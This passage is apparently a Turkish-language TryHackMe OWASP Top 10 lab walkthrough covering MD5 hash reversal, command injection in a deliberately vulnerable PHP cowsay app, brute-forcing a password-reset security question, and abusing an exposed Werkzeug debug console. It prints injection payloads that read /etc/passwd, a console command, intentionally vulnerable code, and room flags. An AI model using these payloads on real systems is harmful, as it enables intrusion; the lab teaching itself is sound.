  â””â”€$ curl https://reversehash.glitch.me/md5?md5=6eea9b7ef19179a06954edd0f6c05ceb

  [{"_id":"qwertyuiop","md5":"6eea9b7ef19179a06954edd0f6c05ceb"}]
  ```
  
  - [Reverse Hash API by fr0sstb1rd](https://fr0stb1rd.gitlab.io/posts/Reverse-Hash-API/)

- `https://md5.gromweb.com/` gibi birÃ§ok tersine md5 dÃ¶nÃ¼ÅŸtÃ¼rÃ¼cÃ¼ mevcuttur. webde `reverse md5 lookup` diye aratarak binlerce Ã¶rneÄŸine ulaÅŸabilirsiniz.

- `admin` kullanÄ±cÄ±sÄ±nÄ± parolasÄ±nÄ± `qwertyuiop` olarak bulduk. Åimdi giriÅŸ yapalÄ±m.
  
  ![](https://i.ibb.co/VWTP7Pp5/8-7.png)

### 8.8 Bayrak Yakalamaca

- BulduÄŸumuz bilgilerle giriÅŸ yapalÄ±m:

  ![](https://i.ibb.co/fGT4SjsM/8-8.png)

  BayraÄŸÄ± yakaladÄ±k: `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

### 8.9. SonuÃ§ ve Ã–nlemler

Bu test sonucunda aÅŸaÄŸÄ±daki gÃ¼venlik aÃ§Ä±klarÄ± tespit edilmiÅŸtir:

1. **Dizin Listeleme**: `/assets` dizini herkese aÃ§Ä±k olup listelenebiliyordu. **Dizin listelemenin kapatÄ±lmasÄ± gerekir.**
2. **VeritabanÄ± DosyasÄ±nÄ±n SÄ±zmasÄ±**: `webapp.db` dosyasÄ±nÄ±n herkese aÃ§Ä±k dizinde bulunmasÄ± bÃ¼yÃ¼k bir risk oluÅŸturuyor. **Bu gibi hassas dosyalar, sunucunun eriÅŸilemeyen bÃ¶lÃ¼mlerinde tutulmalÄ±dÄ±r.**
3. **MD5 Hash KullanÄ±mÄ±**: KullanÄ±cÄ± parolalarÄ± MD5 hash ile korunuyordu, ancak MD5 kÄ±rÄ±labilir bir hash algoritmasÄ±dÄ±r. **SHA-256 veya bcrypt gibi gÃ¼clÃ¼ hash algoritmalarÄ± kullanÄ±lmalÄ±dÄ±r.**
4. **ZayÄ±f Parola KullanÄ±mÄ±**: Admin hesabÄ±nÄ±n ÅŸifresi `qwertyuiop` gibi kolay tahmin edilebilir bir parolaydÄ±. **GÃ¼Ã§lÃ¼ parola politikalarÄ± uygulanmalÄ±dÄ±r.**

## GÃ¶rev 9: ğŸ›‘ Injection

### Enjeksiyon AÃ§Ä±klarÄ± Nedir?  
GÃ¼nÃ¼mÃ¼z uygulamalarÄ±nda **enjeksiyon aÃ§Ä±klarÄ±** oldukÃ§a yaygÄ±ndÄ±r. Bu aÃ§Ä±klar, uygulamanÄ±n **kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan girdileri komut veya parametre olarak yorumlamasÄ±** nedeniyle ortaya Ã§Ä±kar.  
Enjeksiyon saldÄ±rÄ±larÄ±, kullanÄ±lan teknolojilere ve bu teknolojilerin girdileri nasÄ±l yorumladÄ±ÄŸÄ±na baÄŸlÄ±dÄ±r. YaygÄ±n Ã¶rneklerden bazÄ±larÄ± ÅŸunlardÄ±r:  

- **SQL Enjeksiyonu:**  
  - KullanÄ±cÄ±dan alÄ±nan girdinin **SQL sorgularÄ±na doÄŸrudan dahil edilmesiyle** ortaya Ã§Ä±kar.  
  - Bir saldÄ±rgan, **Ã¶zel SQL sorgularÄ±** gÃ¶ndererek veritabanÄ±ndaki bilgileri okuyabilir, deÄŸiÅŸtirebilir veya silebilir.  
  - Bu, kiÅŸisel veriler ve kullanÄ±cÄ± kimlik bilgileri gibi hassas bilgilerin Ã§alÄ±nmasÄ±na yol aÃ§abilir.  

- **Komut Enjeksiyonu:**  
  - KullanÄ±cÄ± girdisinin **sistem komutlarÄ±na iletilmesiyle** gerÃ§ekleÅŸir.  
  - SaldÄ±rgan, **yetkisiz sistem komutlarÄ± Ã§alÄ±ÅŸtÄ±rarak** sunucudaki dosyalara veya diÄŸer kullanÄ±cÄ± verilerine eriÅŸebilir.  

### Enjeksiyon SaldÄ±rÄ±larÄ±na KarÅŸÄ± Korunma  
Enjeksiyon saldÄ±rÄ±larÄ±nÄ± Ã¶nlemenin temel yolu, **kullanÄ±cÄ± girdilerinin sorgu veya komut olarak yorumlanmasÄ±nÄ± engellemektir**. Bunun iÃ§in Ã§eÅŸitli yÃ¶ntemler mevcuttur:  

- **Ä°zin listesi kullanÄ±mÄ±:**  
  - Sunucuya gÃ¶nderilen girdiler, gÃ¼venli girdilerin yer aldÄ±ÄŸÄ± **bir liste ile karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r**.  
  - YalnÄ±zca gÃ¼venli olarak iÅŸaretlenen girdiler iÅŸleme alÄ±nÄ±r. GÃ¼venli deÄŸilse, uygulama bir hata dÃ¶ndÃ¼rerek iÅŸlemi durdurur.  

- **Tehlikeli karakterleri temizleme:**  
  - Girdi iÃ§inde zararlÄ± olabilecek karakterler varsa, **iÅŸlenmeden Ã¶nce kaldÄ±rÄ±lÄ±r**.  

Tehlikeli karakterler, **verilerin iÅŸlenme ÅŸeklini deÄŸiÅŸtirebilecek girdiler** olarak sÄ±nÄ±flandÄ±rÄ±lÄ±r.  
Elle izin listeleri oluÅŸturmak veya giriÅŸleri temizlemek yerine, **bu iÅŸlemleri otomatik olarak gerÃ§ekleÅŸtiren Ã§eÅŸitli gÃ¼venlik kÃ¼tÃ¼phaneleri** kullanÄ±labilir.

## GÃ¶rev 10: Komut Enjeksiyonu

**Komut Enjeksiyonu**, bir web uygulamasÄ±nÄ±n sunucu tarafÄ±nda **PHP** gibi bir dil kullanarak iÅŸletim sisteminin konsolu ile doÄŸrudan etkileÅŸime girdiÄŸi durumlarda meydana gelir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, saldÄ±rganÄ±n sistem komutlarÄ±nÄ± rastgele Ã§alÄ±ÅŸtÄ±rmasÄ±na izin verir. SaldÄ±rgan, dosya listeleri alabilir, iÃ§erik okuyabilir, sistem hakkÄ±nda bilgi toplayabilir ve hatta sunucuda tam kontrol elde edebilir.

Bir saldÄ±rgan, bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kullanarak sunucu Ã¼zerinde daha fazla keÅŸif yapabilir ve diÄŸer sistemlere yayÄ±lmanÄ±n yollarÄ±nÄ± arayabilir.

### Kod Ã–rneÄŸi

Bir senaryo dÃ¼ÅŸÃ¼nelim: MooCorp, inek ASCII sanatÄ± oluÅŸturmak iÃ§in bir web uygulamasÄ± geliÅŸtiriyor. `cowsay` adlÄ± **Linux** komutunu keÅŸfediyorlar. Bu komut, bir ineÄŸe ASCII ÅŸeklinde konuÅŸma yaptÄ±rÄ±yor. Bunun yerine, `cowsay` komutunu doÄŸrudan Ã§alÄ±ÅŸtÄ±ran bir PHP kodu yazmaya karar veriyorlar.

AÅŸaÄŸÄ±daki kodu inceleyelim. **Komut enjeksiyonuna** neden duyarlÄ± olduÄŸunu bulabilir misiniz?

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```

Bu kodun yaptÄ±ÄŸÄ± iÅŸlemler:

1. "mooing" parametresi var mÄ± kontrol edilir. Varsa, `$mooing` deÄŸiÅŸkenine atanÄ±r.
2. "cow" parametresi var mÄ± kontrol edilir. Varsa, `$cow` deÄŸiÅŸkenine atanÄ±r.
3. `passthru("perl /usr/bin/cowsay -f $cow $mooing");` fonksiyonu Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Bu fonksiyon, verilen komutu sistem konsolunda Ã§alÄ±ÅŸtÄ±rÄ±r ve Ã§Ä±ktÄ±yÄ± tarayÄ±cÄ±ya gÃ¶nderir.

Buradaki gÃ¼venlik aÃ§Ä±ÄŸÄ±, `$cow` ve `$mooing` deÄŸiÅŸkenlerinin doÄŸrudan komut iÃ§ine eklenmesidir. EÄŸer saldÄ±rgan bu deÄŸiÅŸkenlere Ã¶zel karakterler eklerse, ek komutlar Ã§alÄ±ÅŸtÄ±rÄ±labilir. Daha fazla bilgi iÃ§in [PHP passthru()](https://www.php.net/manual/en/function.passthru.php) dokÃ¼manÄ±na bakabilirsiniz.

![Komut Enjeksiyonu DiyagramÄ±](https://i.ibb.co/LzdzwtNx/10-1-1.png)

### Komut Enjeksiyonunu Kullanma


Åimdi, **bash** iÃ§inde yer alan "inline komutlarÄ±" kullanarak bu aÃ§Ä±ÄŸÄ± sÃ¶mÃ¼relim. **Bash**, komut iÃ§inde komut Ã§alÄ±ÅŸtÄ±rmayÄ± destekler. Bunun iÃ§in aÅŸaÄŸÄ±daki formatÄ± kullanÄ±rÄ±z:

```bash
$(komut_buraya)
```

Ã–rneÄŸin:

```bash
echo $(whoami)
```

Bu komut `whoami` komutunun Ã§Ä±ktÄ±sÄ±nÄ± alÄ±r ve `echo` komutuna parametre olarak verir:

![](https://i.ibb.co/6J8Y69pt/10-0000.png)

AynÄ± yÃ¶ntemi **cowsay** sunucusunda kullanabiliriz:

![Payload GÃ¶nderme](https://i.ibb.co/HD3DKGMy/10-2.png)

Bu yÃ¶ntemi kullanarak aÅŸaÄŸÄ±daki komutlarÄ± deneyebilirsiniz:

- `whoami`
- `id`
- `ifconfig` veya `ip addr`
- `uname -a`
- `ps -ef`

Deney yapmak iÃ§in makinamÄ±zÄ± Ã§alÄ±ÅŸtÄ±rÄ±p inceleme yapalÄ±m.

### Bayrak Yakalamaca

- Ã–nceki bilgilerimize dayanarak deneme yapalÄ±m:

  ![](https://i.ibb.co/VWGgYhrv/10-1.png)

- Kim olduÄŸumuzu gÃ¶rmeye Ã§alÄ±ÅŸalÄ±m. Ãœstte anlatÄ±lan haricinde bir yol deneyelim: `fr0stb1rd;id`

  ![](https://i.ibb.co/mVYsZYq1/10-2.png)

  `apache` kullanÄ±cÄ±sÄ±yÄ±z. Bir bayraÄŸÄ± yakaladÄ±k.

- BulunduÄŸumuz dizini listeleyelim: `fr0stb1rd;ls`

  ![](https://i.ibb.co/6kJ7VHH/10-3.png)

  `drpepper.txt` ilginÃ§ bir dosya. BayraÄŸÄ±mÄ±zÄ±n biri bu.

- Ä°ÅŸletim sistemi detaylarÄ±na bakalÄ±m: `fr0stb1rd;cat /etc/os-release`

  ![](https://i.ibb.co/Hf409X8b/10-4.png)

  ```bash
  < fr0stb1rd >
  ----------- 
          \   ^__^
          \  (oo)\_______
              (__)\       )\/\
                  ||----w |
                  ||     ||
  NAME="Alpine Linux"
  ID=alpine
  VERSION_ID=3.16.0
  PRETTY_NAME="Alpine Linux v3.16"
  HOME_URL="https://alpinelinux.org/"
  BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
  ```

  `3.16.0` Alpine Linux sÃ¼rÃ¼mÃ¼. Bir bayraÄŸÄ± daha yakaladÄ±k. 

- KullanÄ±cÄ± listesine bakalÄ±m: `fr0stb1rd;cat /etc/passwd`

  ![](https://i.ibb.co/NdcKDmNK/10-5.png)

  ```bash
  ___________ 
  < fr0stb1rd >
  ----------- 
          \   ^__^
          \  (oo)\_______
              (__)\       )\/\
                  ||----w |
                  ||     ||
  root:x:0:0:root:/root:/bin/ash
  bin:x:1:1:bin:/bin:/sbin/nologin
  daemon:x:2:2:daemon:/sbin:/sbin/nologin
  adm:x:3:4:adm:/var/adm:/sbin/nologin
  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
  sync:x:5:0:sync:/sbin:/bin/sync
  shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
  halt:x:7:0:halt:/sbin:/sbin/halt
  mail:x:8:12:mail:/var/mail:/sbin/nologin
  news:x:9:13:news:/usr/lib/news:/sbin/nologin
  uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
  operator:x:11:0:operator:/root:/sbin/nologin
  man:x:13:15:man:/usr/man:/sbin/nologin
  postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
  cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
  ftp:x:21:21::/var/lib/ftp:/sbin/nologin
  sshd:x:22:22:sshd:/dev/null:/sbin/nologin
  at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
  squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
  xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
  games:x:35:35:games:/usr/games:/sbin/nologin
  cyrus:x:85:12::/usr/cyrus:/sbin/nologin
  vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
  ntp:x:123:123:NTP:/var/empty:/sbin/nologin
  smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
  guest:x:405:100:guest:/dev/null:/sbin/nologin
  nobody:x:65534:65534:nobody:/:/sbin/nologin
  apache:x:100:101:apache:/var/www:/sbin/nologin
  ```

  Bu listeyi analiz edersek:  

    - **Root KullanÄ±cÄ±sÄ±:** `root` (UID = 0)  
    - **Servis KullanÄ±cÄ±larÄ±:** `bin, daemon, adm, lp, sync, shutdown, halt, mail, news, uucp, operator, man, postmaster, cron, ftp, sshd, at, squid, xfs, games, cyrus, vpopmail, ntp, smmsp, guest, nobody, apache`  
      - Bunlar sistem servisleri iÃ§in aÃ§Ä±lmÄ±ÅŸ kullanÄ±cÄ±lardÄ±r ve genellikle shell eriÅŸimi yoktur (`/sbin/nologin`).  
    - **Root Olmayan ve Servis Olmayan KullanÄ±cÄ±lar:**  
      - Listede herhangi bir gerÃ§ek kullanÄ±cÄ± (Ã¶rneÄŸin, normal bir insan kullanÄ±cÄ±sÄ±) gÃ¶rÃ¼nmÃ¼yor.  

    - **root olmayan ve servis olmayan kullanÄ±cÄ± sayÄ±sÄ±: 0**. Bu da sorumuzun cevabÄ±nÄ± 0 yapar. (`How many non-root/non-service/non-daemon users are there?`)

    - EÄŸer gerÃ§ek bir kullanÄ±cÄ± eklenmiÅŸ olsaydÄ±, onun giriÅŸ kabuÄŸu (`/bin/bash`, `/bin/zsh` gibi) olurdu ve sistem servis kullanÄ±cÄ±larÄ±ndan ayrÄ±lÄ±rdÄ±.

    - `apache:x:100:101:apache:/var/www:/sbin/nologin` satÄ±rÄ±na bakarsak `apache` kullanÄ±cÄ±sÄ±nÄ±n Ã¶ntanÄ±mlÄ± kabuÄŸunun `/sbin/nologin` olduÄŸunu gÃ¶rÃ¼rÃ¼z. Bu da diÄŸer bayraÄŸÄ±mÄ±z (What is the user's shell set as?).

## GÃ¶rev 11: ğŸ›‘ Insecure Design

**GÃ¼vensiz tasarÄ±m**, uygulamanÄ±n mimarisinde doÄŸuÅŸtan gelen gÃ¼venlik aÃ§Ä±klarÄ±nÄ± ifade eder. Bu aÃ§Ä±klar, kÃ¶tÃ¼ uygulamalar veya yanlÄ±ÅŸ yapÄ±landÄ±rmalardan kaynaklanmaz; aksine, tÃ¼m uygulamanÄ±n (veya bir kÄ±smÄ±nÄ±n) temel fikri baÅŸtan itibaren hatalÄ±dÄ±r. Ã‡oÄŸu zaman, bu tÃ¼r gÃ¼venlik aÃ§Ä±klarÄ±, uygulamanÄ±n planlama aÅŸamalarÄ±nda yetersiz tehdit modellemesi yapÄ±ldÄ±ÄŸÄ±nda ortaya Ã§Ä±kar ve nihai uygulamaya kadar yayÄ±lÄ±r. BazÄ± durumlarda ise, gÃ¼vensiz tasarÄ±m aÃ§Ä±klarÄ±, geliÅŸtiricilerin test sÃ¼reÃ§lerini kolaylaÅŸtÄ±rmak iÃ§in koda "kÄ±sayollar" eklemesiyle de oluÅŸabilir. Ã–rneÄŸin, bir geliÅŸtirici, geliÅŸtirme aÅŸamasÄ±nda OTP (tek kullanÄ±mlÄ±k ÅŸifre) doÄŸrulamasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakarak uygulamanÄ±n geri kalanÄ±nÄ± her oturum aÃ§Ä±ÅŸta manuel olarak kod girmek zorunda kalmadan hÄ±zlÄ±ca test edebilir, ancak uygulamayÄ± Ã¼retime gÃ¶nderirken bunu yeniden etkinleÅŸtirmeyi unutabilir.

### GÃ¼vensiz Åifre SÄ±fÄ±rlama

Bu tÃ¼r gÃ¼venlik aÃ§Ä±klarÄ±na iyi bir Ã¶rnek, bir sÃ¼re Ã¶nce [Instagram'da yaÅŸandÄ±](https://thezerohack.com/hack-any-instagram). Instagram, kullanÄ±cÄ±larÄ±n unutulan ÅŸifrelerini sÄ±fÄ±rlamalarÄ±na olanak tanÄ±mak iÃ§in cep telefonlarÄ±na SMS yoluyla 6 haneli bir doÄŸrulama kodu gÃ¶nderiyordu. EÄŸer bir saldÄ±rgan bir kurbanÄ±n hesabÄ±na eriÅŸmek isterse, bu 6 haneli kodu kaba kuvvet (brute-force) yÃ¶ntemiyle tahmin etmeye Ã§alÄ±ÅŸabilirdi. BeklendiÄŸi Ã¼zere, bu doÄŸrudan mÃ¼mkÃ¼n deÄŸildi Ã§Ã¼nkÃ¼ Instagram, 250 denemeden sonra kullanÄ±cÄ±nÄ±n daha fazla deneme yapmasÄ±nÄ± engelleyen bir hÄ±z sÄ±nÄ±rlama (rate-limiting) mekanizmasÄ± uygulamÄ±ÅŸtÄ±.

![Kaba kuvvet kodu](https://i.ibb.co/QFtr7pfC/11-1.png)

Ancak, bu hÄ±z sÄ±nÄ±rlamanÄ±n yalnÄ±zca aynÄ± IP adresinden yapÄ±lan kod denemelerine uygulandÄ±ÄŸÄ± fark edildi. EÄŸer bir saldÄ±rgan farklÄ± IP adreslerinden istek gÃ¶nderirse, her IP iÃ§in 250 kod deneyebilirdi. 6 haneli bir kod iÃ§in toplamda 1 milyon olasÄ± kombinasyon bulunur; bu durumda bir saldÄ±rganÄ±n tÃ¼m olasÄ± kodlarÄ± kapsayabilmesi iÃ§in 1.000.000 / 250 = 4000 IP adresine ihtiyacÄ± olurdu. Bu, Ã§ok bÃ¼yÃ¼k bir IP adresi sayÄ±sÄ± gibi gÃ¶rÃ¼nebilir, ancak bulut servisleri sayesinde bu IP'leri nispeten dÃ¼ÅŸÃ¼k bir maliyetle elde etmek mÃ¼mkÃ¼n hale gelir ve bu saldÄ±rÄ± uygulanabilir bir hale dÃ¶nÃ¼ÅŸÃ¼r.

![DaÄŸÄ±tÄ±lmÄ±ÅŸ kaba kuvvet](https://i.ibb.co/tTdrdX9q/11-2.png)

Burada gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n, hiÃ§bir kullanÄ±cÄ±nÄ±n binlerce IP adresini kullanarak aynÄ± anda istekte bulunup sayÄ±sal bir kodu kaba kuvvetle Ã§Ã¶zemeyeceÄŸi fikrine dayandÄ±ÄŸÄ±nÄ± fark edin. Sorun, uygulamanÄ±n uygulanÄ±ÅŸÄ±ndan ziyade tasarÄ±mÄ±nda yatmaktadÄ±r.

GÃ¼vensiz tasarÄ±m aÃ§Ä±klarÄ±, geliÅŸtirme sÃ¼recinin Ã§ok erken bir aÅŸamasÄ±nda ortaya Ã§Ä±ktÄ±ÄŸÄ± iÃ§in, bunlarÄ± Ã§Ã¶zmek genellikle uygulamanÄ±n savunmasÄ±z bÃ¶lÃ¼mÃ¼nÃ¼ baÅŸtan inÅŸa etmeyi gerektirir ve genelde diÄŸer basit kodla ilgili gÃ¼venlik aÃ§Ä±klarÄ±ndan daha zor dÃ¼zeltilir. Bu tÃ¼r gÃ¼venlik aÃ§Ä±klarÄ±ndan kaÃ§Ä±nmanÄ±n en iyi yolu, geliÅŸtirme yaÅŸam dÃ¶ngÃ¼sÃ¼nÃ¼n erken aÅŸamalarÄ±nda tehdit modellemesi yapmaktÄ±r. GÃ¼venli geliÅŸtirme yaÅŸam dÃ¶ngÃ¼lerini nasÄ±l uygulayacaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgi edinmek iÃ§in [SSDLC odasÄ±na](https://tryhackme.com/room/securesdlc) gÃ¶z atmayÄ± unutmayÄ±n.

### Pratik Ã–rnek

Joseph'in hesabÄ±na eriÅŸin. Bu uygulama da ÅŸifre sÄ±fÄ±rlama mekanizmasÄ±nda bir tasarÄ±m kusuruna sahip. Ã–nerilen tasarÄ±mÄ±n zayÄ±f noktasÄ±nÄ± bulup bunu nasÄ±l kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ± Ã§Ã¶zebilecek misiniz?

### Bayrak Yakalamaca

- 85 portuna gidip bir bakalÄ±m:

  ![](https://i.ibb.co/LzVBzSYK/11-1.png)

- joseph'in parolasÄ±nÄ± bilmiyoruz. Parola sÄ±fÄ±rlama tuÅŸuna tÄ±klayalÄ±m. Belki bir ÅŸeyler buluruz:

  ![](https://i.ibb.co/zcSx4gz/11-2.png)

- Favori rengini sordu. EÄŸer bir rate-limit yapmadÄ±larsa bÃ¼tÃ¼n renkleri deneyip belki bir sonuca ulaÅŸabiliriz:

  ![](https://i.ibb.co/4RWdLG5k/11-3.png)

- Webden kÄ±sa bir arama ile bir renk listesi bulabiliriz:

  ![](https://i.ibb.co/xccWdqj/11-5.png)

- Burp Suite ile isteÄŸi yakalayÄ±p kesince bu ÅŸekilde karÅŸÄ±mÄ±za Ã§Ä±kÄ±yor:

  ![](https://i.ibb.co/mV9jJ99b/11-4.png)

- `red` kÄ±smÄ±nÄ± iÅŸaretleyip renk listemizi saÄŸa yapÄ±ÅŸtÄ±ralÄ±m ve intrude edelim:
  
  ![](https://i.ibb.co/mVTs7fbM/11-6.png)

- BÃ¼tÃ¼n sonuÃ§lar `200` dÃ¶ndÃ¼. Ancak response'larÄ±n uzunluklarÄ±na bakarsak bir tanesi farklÄ±:

  ![](https://i.ibb.co/k2kjYCCC/11-7.png)

- Favori rengi `green` olarak verelim ve parola sÄ±fÄ±rlamaya Ã§alÄ±ÅŸalÄ±m:

  ![](https://i.ibb.co/TDJYgNyM/11-8.png)

- ParolamÄ±zÄ± baÅŸarÄ±yla sÄ±fÄ±rladÄ±. Åimdi giriÅŸ yapalÄ±m:

  ![](https://i.ibb.co/DDnjSt7v/11-9.png)

- Sol taraftan Private sekmesine bakalÄ±m:

  ![](https://i.ibb.co/XfXVL8xN/11-10.png)

- BayraÄŸÄ±mÄ±zÄ± `THM{Not_3ven_c4tz_c0uld_sav3_U!}` olarak bulduk.

## GÃ¶rev 12: ğŸ›‘ Security Misconfiguration

GÃ¼venlik YanlÄ±ÅŸ YapÄ±landÄ±rmalarÄ±, diÄŸer Top 10 gÃ¼venlik aÃ§Ä±klarÄ±ndan farklÄ±dÄ±r Ã§Ã¼nkÃ¼ bu tÃ¼r aÃ§Ä±klar, gÃ¼venlik ayarlarÄ±nÄ±n doÄŸru bir ÅŸekilde yapÄ±landÄ±rÄ±labilecekken yapÄ±lmamasÄ± durumunda ortaya Ã§Ä±kar. En gÃ¼ncel yazÄ±lÄ±mÄ± indirseniz bile, yanlÄ±ÅŸ yapÄ±landÄ±rmalar kurulumunuzu savunmasÄ±z hale getirebilir.

GÃ¼venlik yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± ÅŸunlarÄ± iÃ§erir:

- Bulut hizmetlerinde yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ izinler, Ã¶rneÄŸin **S3** depolarÄ±.
- Gereksiz Ã¶zelliklerin etkin bÄ±rakÄ±lmasÄ±, Ã¶rneÄŸin hizmetler, sayfalar, hesaplar veya ayrÄ±calÄ±klar.
- VarsayÄ±lan hesaplarÄ±n deÄŸiÅŸtirilmemiÅŸ ÅŸifrelerle bÄ±rakÄ±lmasÄ±.
- Hata mesajlarÄ±nÄ±n aÅŸÄ±rÄ± detaylÄ± olmasÄ± ve saldÄ±rganlarÄ±n sistem hakkÄ±nda daha fazla bilgi edinmesine olanak tanÄ±masÄ±.
- [**HTTP** gÃ¼venlik baÅŸlÄ±klarÄ±nÄ±n](https://owasp.org/www-project-secure-headers/) kullanÄ±lmamasÄ±.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, genellikle daha fazla gÃ¼venlik aÃ§Ä±ÄŸÄ±na yol aÃ§abilir; Ã¶rneÄŸin, varsayÄ±lan kimlik bilgileri hassas verilere eriÅŸim saÄŸlayabilir, **XML** DÄ±ÅŸ VarlÄ±klarÄ± (**XXE**) veya yÃ¶netici sayfalarÄ±nda **komut enjeksiyonu** gibi sorunlar ortaya Ã§Ä±kabilir.

Daha fazla bilgi iÃ§in, [**OWASP** Top 10 GÃ¼venlik YanlÄ±ÅŸ YapÄ±landÄ±rma](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) giriÅŸine bakabilirsiniz.

### Hata AyÄ±klama ArayÃ¼zleri

YaygÄ±n bir gÃ¼venlik yanlÄ±ÅŸ yapÄ±landÄ±rmasÄ±, Ã¼retim ortamÄ±ndaki yazÄ±lÄ±mlarda hata ayÄ±klama Ã¶zelliklerinin aÃ§Ä±k bÄ±rakÄ±lmasÄ±yla ilgilidir. Hata ayÄ±klama Ã¶zellikleri, genellikle programlama Ã§erÃ§evelerinde geliÅŸtiricilerin, uygulama geliÅŸtirilirken hata ayÄ±klamaya yardÄ±mcÄ± olacak geliÅŸmiÅŸ iÅŸlevlere eriÅŸmesine olanak tanÄ±r. Ancak, geliÅŸtiriciler bu Ã¶zellikleri yayÄ±na almadan Ã¶nce devre dÄ±ÅŸÄ± bÄ±rakmayÄ± unutursa, saldÄ±rganlar bu hata ayÄ±klama iÅŸlevlerini kÃ¶tÃ¼ye kullanabilir.

BÃ¶yle bir gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n Ã¶rneÄŸi, 2015 yÄ±lÄ±nda [Patreonâ€™un hacklenmesi](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/) olayÄ±nda kullanÄ±ldÄ±ÄŸÄ± iddia edilmiÅŸtir. Patreon hacklenmeden beÅŸ gÃ¼n Ã¶nce, bir gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Patreonâ€™a, Werkzeug konsolu iÃ§in aÃ§Ä±k bir hata ayÄ±klama arayÃ¼zÃ¼ bulduÄŸunu bildirmiÅŸti. Werkzeug, Python tabanlÄ± web uygulamalarÄ±nda temel bir bileÅŸendir ve web sunucularÄ±nÄ±n Python kodunu Ã§alÄ±ÅŸtÄ±rmasÄ± iÃ§in bir arayÃ¼z saÄŸlar. Werkzeug, `/console` URLâ€™si Ã¼zerinden eriÅŸilebilen bir hata ayÄ±klama konsolu iÃ§erir veya uygulama bir istisna (exception) oluÅŸturduÄŸunda bu konsol kullanÄ±cÄ±ya sunulur. Her iki durumda da, konsol size gÃ¶nderdiÄŸiniz herhangi bir kodu Ã§alÄ±ÅŸtÄ±rabilen bir Python konsolu saÄŸlar. Bir saldÄ±rgan iÃ§in bu, komutlarÄ± keyfi bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rabileceÄŸi anlamÄ±na gelir.

![Werkzeug Konsolu](https://i.ibb.co/27BNSP5w/12.png)

### Pratik Ã–rnek

Bu **VM**, **OWASP** Top 10 GÃ¼venlik AÃ§Ä±klarÄ± listesinin bir parÃ§asÄ± olarak `GÃ¼venlik YanlÄ±ÅŸ YapÄ±landÄ±rmasÄ±`nÄ± sergiler.

### Bayrak Yakalamaca

Åimdi 86 portuna gidip ve gÃ¼venlik yanlÄ±ÅŸ yapÄ±landÄ±rmasÄ±nÄ± kullanarak uygulamanÄ±n kaynak kodunu okumayÄ± deneyelim.

- Verilen porta gidelim:

  ![](https://i.ibb.co/fgPsVp1/12-1.png)

- Bir todo uygulamasÄ± var. `/console` yoluna gidelim:

  ![](https://i.ibb.co/QFw1WB4S/12-2.png)

- Burada bir kabuÄŸa ulaÅŸÄ±yoruz. Python kodu Ã§alÄ±ÅŸtÄ±rabilir miyiz diye baktÄ±k:

  `import os; print(os.popen("ls -l").read())`

- app.py dosyasÄ±nÄ±n iÃ§ini okuduk:

  ```bash
  [console ready]
  >>> import os; print(os.popen("ls -l").read())
  total 24
  -rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile
  -rw-r--r--    1 root     root          1411 Feb  3  2023 app.py
  -rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt
  drwxr-xr-x    2 root     root          4096 Sep 15  2022 templates
  -rw-r--r--    1 root     root          8192 Sep 15  2022 todo.db

  >>> import os; print(os.popen("cat app.py").read())
  import os
  from flask import Flask, render_template, request, redirect, url_for
  from flask_sqlalchemy import SQLAlchemy

  secret_flag = "THM{Just_a_tiny_misconfiguration}"

  PROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))
  DATABASE = os.path.join(PROJECT_ROOT, 'todo.db')

  app = Flask(__name__)
  app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:////" + DATABASE
  db = SQLAlchemy(app)


  class Todo(db.Model):
      id = db.Column(db.Integer, primary_key=True)
      title = db.Column(db.String(80))
      complete = db.Column(db.Boolean)


  @app.route("/")
  def index():
      todo_list = Todo.query.all()
      return render_template("index.html", todo_list=todo_list)


  @app.route("/add", methods=["POST"])
  def add():
      title = request.form.get("title")
      new_todo = Todo(title=title, complete=False)
      db.session.add(new_todo)
      db.session.commit()
      return redirect(url_for("index"))


  @app.route("/complete/<string:todo_id>")
  def complete(todo_id):
      todo = Todo.query.filter_by(id=todo_id).first()
      todo.complete = not todo.complete
      db.session.commit()
      return redirect(url_for("index"))


  @app.route("/delete/<string:todo_id>")
  def delete(todo_id):
      todo = Todo.query.filter_by(id=todo_id).first()
      db.session.delete(todo)
      db.session.commit()
      return redirect(url_for("index"))


  if __name__ == "__main__":
      db.create_all()
      app.run(host='0.0.0.0', port=5000, debug=True)
  ```

![](https://i.ibb.co/G4bknZzj/the-rock-sus-the-rock-meme-1.gif)

